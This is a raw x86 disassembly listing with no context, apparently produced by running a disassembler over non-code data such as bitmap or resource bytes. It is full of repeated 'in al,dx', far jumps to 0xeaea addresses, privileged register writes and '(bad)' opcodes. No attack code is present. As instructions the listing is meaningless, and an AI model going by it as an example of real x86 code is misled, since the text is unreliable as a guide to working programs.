  4096af:	adc    ch,BYTE PTR [ebx-0x1c19a2a2]
  4096b5:	cmp    DWORD PTR [ecx],edi
  4096b7:	cmp    DWORD PTR [ecx],edi
  4096b9:	add    eax,DWORD PTR [eax]
  4096bb:	in     al,dx
  4096bc:	in     al,dx
  4096bd:	in     al,dx
  4096be:	in     al,dx
  4096bf:	in     al,dx
  4096c0:	in     al,dx
  4096c1:	push   eax
  4096c2:	ss or  al,ch
  4096c5:	call   0xe9297fb2
  4096ca:	aas    
  4096cb:	aas    
  4096cc:	add    DWORD PTR [ecx],eax
  4096ce:	je     0x4096df
  4096d0:	je     0x409683
  4096d2:	sbb    eax,0x3ececec
  4096d7:	enter  0x7921,0x21
  4096db:	cs cs cs adc dl,BYTE PTR cs:[edx]
  4096e1:	adc    ch,BYTE PTR [ebx-0x5bc85b55]
  4096e7:	aaa    
  4096e8:	mov    eax,0xececec5e
  4096ed:	in     al,dx
  4096ee:	in     al,dx
  4096ef:	in     al,dx
  4096f0:	in     al,dx
  4096f1:	in     al,dx
  4096f2:	add    dl,BYTE PTR [ebp-0x17171718]
  4096f8:	call   0x3f807fe5
  4096fd:	dec    esp
  4096fe:	add    DWORD PTR [ebx+esi*1+0x3d],esi
  409702:	in     al,dx
  409703:	in     al,dx
  409704:	in     al,dx
  409705:	in     al,dx
  409706:	adc    al,cl
  409708:	lahf   
  409709:	lahf   
  40970a:	and    DWORD PTR [edi],edx
  40970c:	and    DWORD PTR [esi],ebp
  40970e:	jns    0x40973e
  409710:	cs loop 0x409725
  409713:	adc    dl,BYTE PTR [edx]
  409715:	stos   DWORD PTR es:[edi],eax
  409716:	stos   DWORD PTR es:[edi],eax
  409717:	aaa    
  409718:	mov    ebx,0xecececec
  40971d:	in     al,dx
  40971e:	in     al,dx
  40971f:	in     al,dx
  409720:	in     al,dx
  409721:	in     al,dx
  409722:	cmp    eax,DWORD PTR [edx]
  409724:	and    ebp,eax
  409726:	call   0x3f498013
  40972b:	or     BYTE PTR [edi],bh
  40972d:	aas    
  40972e:	add    DWORD PTR [eax],ecx
  409730:	xor    eax,0xececec57
  409735:	in     al,dx
  409736:	adc    BYTE PTR [edi+ebx*4-0x61],dl
  40973a:	lahf   
  40973b:	pop    ss
  40973c:	pop    ss
  40973d:	pop    ss
  40973e:	jns    0x40976e
  409740:	jns    0x409770
  409742:	cs adc dl,BYTE PTR cs:[edx]
  409746:	adc    bh,BYTE PTR [edx]
  409748:	in     al,dx
  409749:	in     al,dx
  40974a:	in     al,dx
  40974b:	in     al,dx
  40974c:	in     al,dx
  40974d:	in     al,dx
  40974e:	in     al,dx
  40974f:	in     al,dx
  409750:	in     al,dx
  409751:	in     al,dx
  409752:	in     al,dx
  409753:	add    ah,BYTE PTR ds:[ebx]
  409756:	or     BYTE PTR [edi],bh
  409758:	call   0xe9297f9c
  40975d:	aas    
  40975e:	das    
  40975f:	xor    eax,0xececec2a
  409764:	in     al,dx
  409765:	in     al,dx
  409766:	or     DWORD PTR [edi+0x5f],ebx
  409769:	push   esp
  40976a:	lahf   
  40976b:	lahf   
  40976c:	lahf   
  40976d:	pop    ss
  40976e:	pop    ss
  40976f:	pop    ss
  409770:	pop    ss
  409771:	cs cs cs cs cs or ch,ah
  409778:	in     al,dx
  409779:	in     al,dx
  40977a:	in     al,dx
  40977b:	in     al,dx
  40977c:	in     al,dx
  40977d:	in     al,dx
  40977e:	in     al,dx
  40977f:	in     al,dx
  409780:	in     al,dx
  409781:	in     al,dx
  409782:	in     al,dx
  409783:	in     al,dx
  409784:	inc    ebx
  409785:	add    dl,BYTE PTR [ebp-0x1717f7f8]
  40978b:	call   0x97472c98
  409790:	in     al,dx
  409791:	in     al,dx
  409792:	in     al,dx
  409793:	in     al,dx
  409794:	in     al,dx
  409795:	in     al,dx
  409796:	or     DWORD PTR [edi+ebx*2],ebx
  409799:	pop    edi
  40979a:	push   esp
  40979b:	push   esp
  40979c:	push   esp
  40979d:	push   esp
  40979e:	lahf   
  40979f:	lahf   
  4097a0:	pop    ss
  4097a1:	pop    ss
  4097a2:	pop    ss
  4097a3:	and    DWORD PTR [esi],ebp
  4097a5:	pop    ebp
  4097a6:	in     al,dx
  4097a7:	in     al,dx
  4097a8:	in     al,dx
  4097a9:	in     al,dx
  4097aa:	in     al,dx
  4097ab:	in     al,dx
  4097ac:	in     al,dx
  4097ad:	in     al,dx
  4097ae:	in     al,dx
  4097af:	in     al,dx
  4097b0:	in     al,dx
  4097b1:	in     al,dx
  4097b2:	in     al,dx
  4097b3:	in     al,dx
  4097b4:	in     al,dx
  4097b5:	cmp    eax,DWORD PTR [edx]
  4097b7:	dec    eax
  4097b8:	daa    
  4097b9:	and    esi,DWORD PTR [ecx]
  4097bb:	ror    DWORD PTR [eax+0x6],cl
  4097be:	pop    eax
  4097bf:	in     al,dx
  4097c0:	in     al,dx
  4097c1:	in     al,dx
  4097c2:	in     al,dx
  4097c3:	in     al,dx
  4097c4:	in     al,dx
  4097c5:	in     al,dx
  4097c6:	or     DWORD PTR [edi+0x77],esi
  4097c9:	sbb    al,0x5f
  4097cb:	pop    edi
  4097cc:	push   esp
  4097cd:	push   esp
  4097ce:	push   esp
  4097cf:	lahf   
  4097d0:	push   esp
  4097d1:	lahf   
  4097d2:	pop    ss
  4097d3:	pop    ss
  4097d4:	mov    ebx,0xecececec
  4097d9:	in     al,dx
  4097da:	in     al,dx
  4097db:	in     al,dx
  4097dc:	in     al,dx
  4097dd:	in     al,dx
  4097de:	in     al,dx
  4097df:	in     al,dx
  4097e0:	in     al,dx
  4097e1:	in     al,dx
  4097e2:	in     al,dx
  4097e3:	in     al,dx
  4097e4:	in     al,dx
  4097e5:	in     al,dx
  4097e6:	in     al,dx
  4097e7:	push   eax
  4097e8:	inc    edx
  4097e9:	pop    es
  4097ea:	pop    es
  4097eb:	inc    edx
  4097ec:	dec    edx
  4097ed:	in     al,dx
  4097ee:	in     al,dx
  4097ef:	in     al,dx
  4097f0:	in     al,dx
  4097f1:	in     al,dx
  4097f2:	in     al,dx
  4097f3:	in     al,dx
  4097f4:	in     al,dx
  4097f5:	in     al,dx
  4097f6:	or     DWORD PTR [edi+0x77],esi
  4097f9:	ja     0x409872
  4097fb:	dec    ebx
  4097fc:	dec    ebx
  4097fd:	pop    edi
  4097fe:	pop    edi
  4097ff:	pop    edi
  409800:	push   esp
  409801:	lahf   
  409802:	push   esp
  409803:	pop    ebp
  409804:	in     al,dx
  409805:	in     al,dx
  409806:	in     al,dx
  409807:	in     al,dx
  409808:	in     al,dx
  409809:	in     al,dx
  40980a:	in     al,dx
  40980b:	in     al,dx
  40980c:	in     al,dx
  40980d:	in     al,dx
  40980e:	in     al,dx
  40980f:	in     al,dx
  409810:	in     al,dx
  409811:	in     al,dx
  409812:	in     al,dx
  409813:	in     al,dx
  409814:	in     al,dx
  409815:	in     al,dx
  409816:	in     al,dx
  409817:	in     al,dx
  409818:	in     al,dx
  409819:	in     al,dx
  40981a:	in     al,dx
  40981b:	in     al,dx
  40981c:	in     al,dx
  40981d:	in     al,dx
  40981e:	in     al,dx
  40981f:	in     al,dx
  409820:	in     al,dx
  409821:	in     al,dx
  409822:	in     al,dx
  409823:	in     al,dx
  409824:	in     al,dx
  409825:	in     al,dx
  409826:	es ja  0x4098a0
  409829:	ja     0x4098a2
  40982b:	ja     0x4098a4
  40982d:	sbb    al,0x1c
  40982f:	pop    edi
  409830:	pop    edi
  409831:	pop    edi
  409832:	lods   eax,DWORD PTR ds:[esi]
  409833:	in     al,dx
  409834:	in     al,dx
  409835:	in     al,dx
  409836:	in     al,dx
  409837:	in     al,dx
  409838:	in     al,dx
  409839:	in     al,dx
  40983a:	in     al,dx
  40983b:	in     al,dx
  40983c:	in     al,dx
  40983d:	in     al,dx
  40983e:	in     al,dx
  40983f:	in     al,dx
  409840:	in     al,dx
  409841:	in     al,dx
  409842:	in     al,dx
  409843:	in     al,dx
  409844:	in     al,dx
  409845:	in     al,dx
  409846:	in     al,dx
  409847:	in     al,dx
  409848:	in     al,dx
  409849:	in     al,dx
  40984a:	in     al,dx
  40984b:	in     al,dx
  40984c:	in     al,dx
  40984d:	in     al,dx
  40984e:	in     al,dx
  40984f:	in     al,dx
  409850:	in     al,dx
  409851:	in     al,dx
  409852:	in     al,dx
  409853:	in     al,dx
  409854:	in     al,dx
  409855:	in     al,dx
  409856:	or     ch,BYTE PTR [ebx]
  409858:	sub    esp,DWORD PTR [ecx+0x71]
  40985b:	ja     0x4098d4
  40985d:	ja     0x4098d6
  40985f:	dec    ebx
  409860:	sbb    al,0x3a
  409862:	in     al,dx
  409863:	in     al,dx
  409864:	in     al,dx
  409865:	in     al,dx
  409866:	in     al,dx
  409867:	in     al,dx
  409868:	in     al,dx
  409869:	in     al,dx
  40986a:	in     al,dx
  40986b:	in     al,dx
  40986c:	in     al,dx
  40986d:	in     al,dx
  40986e:	in     al,dx
  40986f:	in     al,dx
  409870:	in     al,dx
  409871:	in     al,dx
  409872:	in     al,dx
  409873:	in     al,dx
  409874:	in     al,dx
  409875:	in     al,dx
  409876:	in     al,dx
  409877:	in     al,dx
  409878:	in     al,dx
  409879:	in     al,dx
  40987a:	in     al,dx
  40987b:	in     al,dx
  40987c:	in     al,dx
  40987d:	in     al,dx
  40987e:	in     al,dx
  40987f:	in     al,dx
  409880:	in     al,dx
  409881:	in     al,dx
  409882:	in     al,dx
  409883:	in     al,dx
  409884:	in     al,dx
  409885:	in     al,dx
  409886:	or     ch,BYTE PTR [ebx]
  409888:	sub    ebp,DWORD PTR [ebx]
  40988a:	popa   
  40988b:	sub    esi,DWORD PTR [ecx+0x77]
  40988e:	jno    0x409907
  409890:	cmp    ch,ah
  409892:	in     al,dx
  409893:	in     al,dx
  409894:	in     al,dx
  409895:	in     al,dx
  409896:	in     al,dx
  409897:	in     al,dx
  409898:	in     al,dx
  409899:	in     al,dx
  40989a:	in     al,dx
  40989b:	in     al,dx
  40989c:	in     al,dx
  40989d:	in     al,dx
  40989e:	in     al,dx
  40989f:	in     al,dx
  4098a0:	in     al,dx
  4098a1:	in     al,dx
  4098a2:	in     al,dx
  4098a3:	in     al,dx
  4098a4:	in     al,dx
  4098a5:	in     al,dx
  4098a6:	in     al,dx
  4098a7:	in     al,dx
  4098a8:	in     al,dx
  4098a9:	in     al,dx
  4098aa:	in     al,dx
  4098ab:	in     al,dx
  4098ac:	in     al,dx
  4098ad:	in     al,dx
  4098ae:	in     al,dx
  4098af:	in     al,dx
  4098b0:	in     al,dx
  4098b1:	in     al,dx
  4098b2:	in     al,dx
  4098b3:	in     al,dx
  4098b4:	in     al,dx
  4098b5:	in     al,dx
  4098b6:	or     cl,BYTE PTR [ebp+0x2b2b2b2b]
  4098bc:	sub    esp,DWORD PTR [ecx+0x71]
  4098bf:	cmp    ch,ah
  4098c1:	in     al,dx
  4098c2:	in     al,dx
  4098c3:	in     al,dx
  4098c4:	in     al,dx
  4098c5:	in     al,dx
  4098c6:	in     al,dx
  4098c7:	in     al,dx
  4098c8:	in     al,dx
  4098c9:	in     al,dx
  4098ca:	in     al,dx
  4098cb:	in     al,dx
  4098cc:	in     al,dx
  4098cd:	in     al,dx
  4098ce:	in     al,dx
  4098cf:	in     al,dx
  4098d0:	in     al,dx
  4098d1:	in     al,dx
  4098d2:	in     al,dx
  4098d3:	in     al,dx
  4098d4:	in     al,dx
  4098d5:	in     al,dx
  4098d6:	in     al,dx
  4098d7:	in     al,dx
  4098d8:	in     al,dx
  4098d9:	in     al,dx
  4098da:	in     al,dx
  4098db:	in     al,dx
  4098dc:	in     al,dx
  4098dd:	in     al,dx
  4098de:	in     al,dx
  4098df:	in     al,dx
  4098e0:	in     al,dx
  4098e1:	in     al,dx
  4098e2:	in     al,dx
  4098e3:	in     al,dx
  4098e4:	in     al,dx
  4098e5:	in     al,dx
  4098e6:	or     DWORD PTR [edx-0x73],edx
  4098e9:	lea    ebp,[ebx]
  4098eb:	sub    ebp,DWORD PTR [ebx]
  4098ed:	sub    ebx,DWORD PTR [esi-0x14]
  4098f0:	in     al,dx
  4098f1:	in     al,dx
  4098f2:	in     al,dx
  4098f3:	in     al,dx
  4098f4:	in     al,dx
  4098f5:	in     al,dx
  4098f6:	in     al,dx
  4098f7:	in     al,dx
  4098f8:	in     al,dx
  4098f9:	in     al,dx
  4098fa:	in     al,dx
  4098fb:	in     al,dx
  4098fc:	in     al,dx
  4098fd:	in     al,dx
  4098fe:	in     al,dx
  4098ff:	in     al,dx
  409900:	in     al,dx
  409901:	in     al,dx
  409902:	in     al,dx
  409903:	in     al,dx
  409904:	in     al,dx
  409905:	in     al,dx
  409906:	in     al,dx
  409907:	sbb    eax,0x3003032a
  40990c:	adc    ebp,esp
  40990e:	in     al,dx
  40990f:	in     al,dx
  409910:	in     al,dx
  409911:	in     al,dx
  409912:	in     al,dx
  409913:	in     al,dx
  409914:	in     al,dx
  409915:	in     al,dx
  409916:	or     DWORD PTR [edx+0x22],edx
  409919:	push   edx
  40991a:	lea    ecx,[ebp-0x1675f573]
  409920:	jmp    0xe95e830e
  409925:	sbb    eax,0x1de91de9
  40992a:	jmp    0xe95e824c
  40992f:	in     al,dx
  409930:	in     al,dx
  409931:	in     al,dx
  409932:	in     al,dx
  409933:	in     al,dx
  409934:	in     al,dx
  409935:	push   edi
  409936:	cmp    eax,0x9e31b15d
  40993b:	into   
  40993c:	pop    ebp
  40993d:	add    BYTE PTR [esp+ebp*8-0x14],al
  409941:	in     al,dx
  409942:	in     al,dx
  409943:	in     al,dx
  409944:	in     al,dx
  409945:	in     al,dx
  409946:	or     DWORD PTR [edx],esp
  409948:	push   edx
  409949:	push   edx
  40994a:	push   edx
  40994b:	push   edx
  40994c:	or     al,cl
  40994e:	sbb    eax,0xe9e9e9e9
  409953:	jmp    0xea2a8275
  409958:	sbb    eax,0x1de9e9e9
  40995d:	jmp    0xed2d864b
  409962:	in     al,dx
  409963:	in     al,dx
  409964:	sub    dh,BYTE PTR [edx]
  409966:	xor    esi,DWORD PTR [edx+eiz*1+0x22]
  40996a:	and    ah,BYTE PTR [edx]
  40996c:	lea    edx,[ebp+0x0]
  40996f:	cmp    ch,ah
  409971:	in     al,dx
  409972:	in     al,dx
  409973:	in     al,dx
  409974:	in     al,dx
  409975:	in     al,dx
  409976:	and    ah,BYTE PTR es:[edx]
  409979:	and    ah,BYTE PTR [edx]
  40997b:	pop    ebp
  40997c:	mov    dl,0x8d
  40997e:	and    ah,BYTE PTR [edx]
  409980:	and    ah,BYTE PTR [edx]
  409982:	and    ah,BYTE PTR [edx]
  409984:	and    ah,BYTE PTR [edx]
  409986:	and    ah,BYTE PTR [edx]
  409988:	and    ah,BYTE PTR [edx]
  40998a:	and    ah,BYTE PTR [edx]
  40998c:	and    ah,BYTE PTR [edx]
  40998e:	jmp    0xed2d867f
  409993:	jnp    0x4099ca
  409995:	xor    al,0x74
  409997:	mov    cr4,edx
  40999a:	and    ah,BYTE PTR [edx]
  40999c:	and    ah,BYTE PTR [edx]
  40999e:	inc    eax
  40999f:	add    BYTE PTR [edx],bh
  4099a1:	in     al,dx
  4099a2:	in     al,dx
  4099a3:	in     al,dx
  4099a4:	in     al,dx
  4099a5:	in     al,dx
  4099a6:	or     ah,BYTE PTR [edx]
  4099a8:	and    ah,BYTE PTR [edx]
  4099aa:	pop    esi
  4099ab:	xor    esp,DWORD PTR [edx]
  4099ad:	and    ah,BYTE PTR [edx]
  4099af:	and    ah,BYTE PTR [edx]
  4099b1:	and    ah,BYTE PTR [edx]
  4099b3:	and    ah,BYTE PTR [edx]
  4099b5:	and    ah,BYTE PTR [edx]
  4099b7:	and    ah,BYTE PTR [edx]
  4099b9:	and    ah,BYTE PTR [edx]
  4099bb:	and    ah,BYTE PTR [edx]
  4099bd:	and    ch,cl
  4099bf:	in     al,dx
  4099c0:	in     al,dx
  4099c1:	in     al,dx
  4099c2:	pop    eax
  4099c3:	push   es
  4099c4:	das    
  4099c5:	ins    BYTE PTR es:[edi],dx
  4099c6:	add    DWORD PTR [edi+ecx*1+0x22],esi
  4099ca:	and    ah,BYTE PTR [edx]
  4099cc:	and    ah,BYTE PTR [edx]
  4099ce:	and    al,BYTE PTR [eax+0x38]
  4099d1:	inc    esp
  4099d2:	in     al,dx
  4099d3:	in     al,dx
  4099d4:	in     al,dx
  4099d5:	in     al,dx
  4099d6:	or     ah,BYTE PTR [edx]
  4099d8:	and    bl,BYTE PTR [esi-0x34]
  4099db:	fucomi st,st(2)
  4099dd:	jmp    0xeaea:0xeaeaeaea
  4099e4:	jmp    0xeaea:0xeaeaeaea
  4099eb:	jmp    0xecec:0xece9eaea
  4099f2:	push   es
  4099f3:	xchg   ebp,eax
  4099f4:	aas    
  4099f5:	ins    BYTE PTR es:[edi],dx
  4099f6:	ins    BYTE PTR es:[edi],dx
  4099f7:	pushf  
  4099f8:	scas   al,BYTE PTR es:[edi]
  4099f9:	mov    bh,0x8f
  4099fb:	test   BYTE PTR [ecx],dl
  4099fd:	and    ah,BYTE PTR [edx]
  4099ff:	and    dl,BYTE PTR [ebp+0x38]
  409a02:	in     al,dx
  409a03:	in     al,dx
  409a04:	in     al,dx
  409a05:	in     al,dx
  409a06:	or     ah,BYTE PTR [edx]
  409a08:	or     bl,al
  409a0a:	jmp    0xeaea:0xeaeaeaea
  409a11:	jmp    0xeaea:0xeaeaeaea
  409a18:	jmp    0xe9ea:0xeaeaeaea
  409a1f:	in     al,dx
  409a20:	in     al,dx
  409a21:	dec    edx
  409a22:	dec    eax
  409a23:	or     BYTE PTR [eax],cl
  409a25:	aas    
  409a26:	pushf  
  409a27:	xchg   esi,eax
  409a28:	and    eax,0xdfa1a329
  409a2d:	adc    DWORD PTR [edx],esp
  409a2f:	and    ah,BYTE PTR [edx]
  409a31:	cwde   
  409a32:	adc    ebp,esp
  409a34:	in     al,dx
  409a35:	in     al,dx
  409a36:	or     dl,BYTE PTR [ecx+esi*1-0x151515de]
  409a3d:	jmp    0xeaea:0xeaeaeaea
  409a44:	jmp    0xeaea:0xeaeaeaea
  409a4b:	jmp    0x3eec:0xece9eaea
  409a52:	ss aas 
  409a54:	call   0x2c5fe061
  409a59:	and    eax,0x84a1a329
  409a5e:	and    ah,BYTE PTR [edx]
  409a60:	and    ch,cl
  409a62:	pop    esi
  409a63:	in     al,dx
  409a64:	in     al,dx
  409a65:	in     al,dx
  409a66:	or     bl,BYTE PTR ds:0xeaea228d
  409a6c:	jmp    0xeaea:0xeaeaeaea
  409a73:	jmp    0xeaea:0xeaeaeaea
  409a7a:	jmp    0xecec:0xe9eaeaea
  409a81:	pop    es
  409a82:	xor    DWORD PTR [eax],ecx
  409a84:	aas    
  409a85:	call   0x2c5f9ea4
  409a8a:	and    eax,0x228fa329
  409a8f:	and    ah,BYTE PTR [edx]
  409a91:	xor    DWORD PTR [ebx],eax
  409a93:	in     al,dx
  409a94:	in     al,dx
  409a95:	in     al,dx
  409a96:	jmp    0xea62bcb8
  409a9b:	jmp    0xeaea:0xeaeaeaea
  409aa2:	jmp    0xeaea:0xeaeaeaea
  409aa9:	jmp    0xece9:0xeaeaeaea
  409ab0:	in     al,dx
  409ab1:	pop    es
  409ab2:	mov    edx,0x1a3f08e8
  409ab7:	add    al,0x4
  409ab9:	pop    ds
  409aba:	sub    al,0x25
  409abc:	sub    DWORD PTR [edi-0x61ddddde],esi
  409ac2:	add    ebp,esp
  409ac4:	in     al,dx
  409ac5:	in     al,dx
  409ac6:	sbb    eax,0xea2222e9
  409acb:	jmp    0xeaea:0xeaeaeaea
  409ad2:	jmp    0xeaea:0xeaeaeaea
  409ad9:	jmp    0xece9:0xeaeaeaea
  409ae0:	in     al,dx
  409ae1:	mov    DWORD PTR ds:[edi],edi
  409ae4:	call   0x444e1d1
  409ae9:	add    al,0x1f
  409aeb:	sub    al,0x25
  409aed:	scas   al,BYTE PTR es:[edi]
  409aee:	mov    cr4,edx
  409af1:	jmp    0xed2d8754
  409af6:	jmp    0xea62bde4
  409afb:	jmp    0xeaea:0xeaeaeaea
  409b02:	jmp    0xeaea:0xeaeaeaea
  409b09:	jmp    0xece9:0xeaeaeaea
  409b10:	in     al,dx
  409b11:	push   eax
  409b12:	dec    eax
  409b13:	or     al,ch
  409b15:	or     BYTE PTR [edx+ebx*1+0x1f040404],bl
  409b1c:	xchg   esi,eax
  409b1d:	adc    DWORD PTR [esi],ecx
  409b1f:	and    dh,BYTE PTR [ebp+ebx*2+0x1d]
  409b23:	in     al,dx
  409b24:	in     al,dx
  409b25:	in     al,dx
  409b26:	jmp    0xea62be14
  409b2b:	jmp    0xeaea:0xeaeaeaea
  409b32:	jmp    0xeaea:0xeaeaeaea
  409b39:	jmp    0xece9:0xeaeaeaea
  409b40:	in     al,dx
  409b41:	in     al,dx
  409b42:	add    dl,BYTE PTR [ebp-0x6317c018]
  409b48:	inc    esi
  409b49:	sbb    bl,BYTE PTR [edx]
  409b4b:	inc    esi
  409b4c:	adc    DWORD PTR [ecx+eax*1+0x74],ecx
  409b50:	xor    edi,DWORD PTR ds:0xecececec
  409b56:	jmp    0xea62be44
  409b5b:	jmp    0xeaea:0xeaeaeaea
  409b62:	jmp    0xeaea:0xeaeaeaea
  409b69:	jmp    0xece9:0xeaeaeaea
  409b70:	in     al,dx
  409b71:	in     al,dx
  409b72:	add    ah,BYTE PTR ss:[ebx]
  409b75:	or     BYTE PTR [edi],bh
  409b77:	or     BYTE PTR [edi],bh
  409b79:	or     BYTE PTR [edi],bh
  409b7b:	or     BYTE PTR [edi],bh
  409b7d:	ins    BYTE PTR es:[edi],dx
  409b7e:	ins    BYTE PTR es:[edi],dx
  409b7f:	or     BYTE PTR ds:0xececec57,dh
  409b85:	in     al,dx
  409b86:	jmp    0xea62be74
  409b8b:	jmp    0xeaea:0xeaeaeaea
  409b92:	jmp    0xeaea:0xeaeaeaea
  409b99:	jmp    0xece9:0xeaeaeaea
  409ba0:	in     al,dx
  409ba1:	in     al,dx
  409ba2:	in     al,dx
  409ba3:	inc    ebx
  409ba4:	add    ah,BYTE PTR [ebx]
  409ba6:	call   0xe92983ea
  409bab:	aas    
  409bac:	call   0x2a75caf0
  409bb1:	in     al,dx
  409bb2:	in     al,dx
  409bb3:	in     al,dx
  409bb4:	in     al,dx
  409bb5:	in     al,dx
  409bb6:	jmp    0x2262bea4
  409bbb:	and    ah,BYTE PTR [edx]
  409bbd:	and    ah,BYTE PTR [edx]
  409bbf:	and    ah,BYTE PTR [edx]
  409bc1:	and    ah,BYTE PTR [edx]
  409bc3:	and    ah,BYTE PTR [edx]
  409bc5:	and    ah,BYTE PTR [edx]
  409bc7:	and    ah,BYTE PTR [edx]
  409bc9:	and    ah,BYTE PTR [edx]
  409bcb:	and    ah,BYTE PTR [edx]
  409bcd:	and    ch,cl
  409bcf:	in     al,dx
  409bd0:	in     al,dx
  409bd1:	in     al,dx
  409bd2:	in     al,dx
  409bd3:	in     al,dx
  409bd4:	add    dl,BYTE PTR ds:[ebp-0x1717f7f8]
  409bdb:	call   0x974730e8
  409be0:	in     al,dx
  409be1:	in     al,dx
  409be2:	in     al,dx
  409be3:	in     al,dx
  409be4:	in     al,dx
  409be5:	in     al,dx
  409be6:	jmp    0x2262bed4
  409beb:	and    ah,BYTE PTR [edx]
  409bed:	and    ah,BYTE PTR [edx]
  409bef:	and    ah,BYTE PTR [edx]
  409bf1:	and    ah,BYTE PTR [edx]
  409bf3:	and    ah,BYTE PTR [edx]
  409bf5:	and    ah,BYTE PTR [edx]
  409bf7:	and    ah,BYTE PTR [edx]
  409bf9:	and    ah,BYTE PTR [edx]
  409bfb:	and    ah,BYTE PTR [edx]
  409bfd:	and    ch,cl
  409bff:	in     al,dx
  409c00:	in     al,dx
  409c01:	in     al,dx
  409c02:	in     al,dx
  409c03:	in     al,dx
  409c04:	in     al,dx
  409c05:	cmp    eax,DWORD PTR [edx]
  409c07:	jnp    0x409b92
  409c09:	mov    edx,0x67b36d6
  409c0e:	pop    eax
  409c0f:	in     al,dx
  409c10:	in     al,dx
  409c11:	in     al,dx
  409c12:	in     al,dx
  409c13:	in     al,dx
  409c14:	in     al,dx
  409c15:	in     al,dx
  409c16:	jmp    0xe9d38604
  409c1b:	xchg   edx,eax
  409c1c:	jmp    0xe9d385b3
  409c21:	xchg   edx,eax
  409c22:	jmp    0xe9d385b9
  409c27:	xchg   edx,eax
  409c28:	jmp    0xe9d385bf
  409c2d:	jmp    0xed2d891b
  409c32:	in     al,dx
  409c33:	in     al,dx
  409c34:	in     al,dx
  409c35:	in     al,dx
  409c36:	in     al,dx
  409c37:	dec    edx
  409c38:	ds pop es
  409c3a:	pop    es
  409c3b:	ds dec edx
  409c3d:	in     al,dx
  409c3e:	in     al,dx
  409c3f:	in     al,dx
  409c40:	in     al,dx
  409c41:	in     al,dx
  409c42:	in     al,dx
  409c43:	in     al,dx
  409c44:	in     al,dx
  409c45:	in     al,dx
  409c46:	jmp    0xea2a8634
  409c4b:	sbb    eax,0x13e9e9e9
  409c50:	jmp    0xe95e863e
  409c55:	jmp    0xea29b043
  409c5a:	jmp    0xea2a857c
  409c5f:	in     al,dx
  409c60:	in     al,dx
  409c61:	in     al,dx
  409c62:	in     al,dx
  409c63:	in     al,dx
  409c64:	in     al,dx
  409c65:	in     al,dx
  409c66:	in     al,dx
  409c67:	in     al,dx
  409c68:	in     al,dx
  409c69:	in     al,dx
  409c6a:	in     al,dx
  409c6b:	in     al,dx
  409c6c:	in     al,dx
  409c6d:	in     al,dx
  409c6e:	in     al,dx
  409c6f:	in     al,dx
  409c70:	in     al,dx
  409c71:	in     al,dx
  409c72:	in     al,dx
  409c73:	in     al,dx
  409c74:	in     al,dx
  409c75:	in     al,dx
  409c76:	in     al,dx
  409c77:	in     al,dx
  409c78:	in     al,dx
  409c79:	in     al,dx
  409c7a:	in     al,dx
  409c7b:	in     al,dx
  409c7c:	in     al,dx
  409c7d:	in     al,dx
  409c7e:	in     al,dx
  409c7f:	in     al,dx
  409c80:	in     al,dx
  409c81:	in     al,dx
  409c82:	in     al,dx
  409c83:	in     al,dx
  409c84:	in     al,dx
  409c85:	in     al,dx
  409c86:	in     al,dx
  409c87:	in     al,dx
  409c88:	in     al,dx
  409c89:	in     al,dx
  409c8a:	in     al,dx
  409c8b:	in     al,dx
  409c8c:	in     al,dx
  409c8d:	in     al,dx
  409c8e:	in     al,dx
  409c8f:	in     al,dx
  409c90:	(bad)  
  409c91:	(bad)  
  409c92:	(bad)  
  409c93:	(bad)  
  409c94:	(bad)  
  409c95:	inc    DWORD PTR [eax]
  409c97:	add    bh,bh
  409c99:	(bad)  
  409c9a:	(bad)  
  409c9b:	jmp    eax
  409c9d:	inc    DWORD PTR [eax]
  409c9f:	add    bh,bh
  409ca1:	(bad)  
  409ca2:	(bad)  
  409ca3:	inc    eax
  409ca5:	inc    DWORD PTR [eax]
  409ca7:	add    bh,bh
  409ca9:	(bad)  
  409caa:	(bad)  
  409cab:	inc    eax
  409cad:	inc    DWORD PTR [eax]
  409caf:	add    bh,bh
  409cb1:	(bad)  
  409cb2:	(bad)  
  409cb3:	inc    DWORD PTR [ecx-0xffff01]
  409cb9:	(bad)  
  409cba:	(bad)  
  409cbb:	inc    DWORD PTR [ecx-0x1ffff01]
  409cc1:	pop    es
  409cc2:	(bad)  
  409cc3:	inc    DWORD PTR [ebx]
  409cc5:	inc    DWORD PTR [eax]
  409cc7:	add    al,bh
  409cc9:	add    edi,edi
  409ccb:	inc    DWORD PTR [ebx]
  409ccd:	inc    DWORD PTR [eax]
  409ccf:	add    al,dh
  409cd1:	add    ch,bh
  409cd3:	inc    BYTE PTR [edi]
  409cd5:	inc    DWORD PTR [eax]
  409cd7:	add    al,ah
  409cd9:	add    BYTE PTR [esi+edi*8+0x7],bh
  409cdd:	inc    DWORD PTR [eax]
  409cdf:	add    al,al
  409ce1:	add    BYTE PTR [esp+edi*2],bh
  409ce4:	ud0    eax,DWORD PTR [eax]
  409ce7:	add    al,al
  409ce9:	add    BYTE PTR [esp+edi*1],bh
  409cec:	ud0    eax,DWORD PTR [eax]
  409cef:	add    BYTE PTR [eax+0x1f181c00],al
  409cf5:	inc    DWORD PTR [eax]
  409cf7:	add    BYTE PTR [eax+0x1f081c00],al
  409cfd:	inc    DWORD PTR [eax]
  409cff:	add    BYTE PTR [eax+0x3f001c00],al
  409d05:	inc    DWORD PTR [eax]
  409d07:	add    BYTE PTR [eax+0x3f001c00],al
  409d0d:	inc    DWORD PTR [eax]
  409d0f:	add    BYTE PTR [eax+0x1c00],al
  409d15:	pop    ds
  409d16:	add    BYTE PTR [eax],al
  409d18:	add    BYTE PTR [eax],0x1c
  409d1b:	add    BYTE PTR [eax],al
  409d1d:	aas    
  409d1e:	add    BYTE PTR [eax],al
  409d20:	rol    BYTE PTR [eax],0x3c
  409d23:	add    BYTE PTR [eax],al
  409d25:	jg     0x409d27
  409d27:	add    al,al
  409d29:	add    BYTE PTR [eax+eax*1],bh
  409d2c:	add    bh,bh
  409d2e:	add    BYTE PTR [eax],al
  409d30:	loopne 0x409d32
  409d32:	jl     0x409d34
  409d34:	add    edi,edi
  409d36:	add    BYTE PTR [eax],al
  409d38:	lock add ah,bh
  409d3b:	add    BYTE PTR [ebx],al
  409d3d:	inc    DWORD PTR [eax]
  409d3f:	add    al,bh
  409d41:	add    esp,edi
  409d43:	add    BYTE PTR [edi],al
  409d45:	inc    DWORD PTR [eax]
  409d47:	add    dh,bh
  409d49:	pop    es
  409d4a:	cld    
  409d4b:	add    BYTE PTR [edi],cl
  409d4d:	inc    DWORD PTR [eax]
  409d4f:	add    bh,bh
  409d51:	(bad)  
  409d52:	cld    
  409d53:	add    BYTE PTR [edi],bl
  409d55:	inc    DWORD PTR [eax]
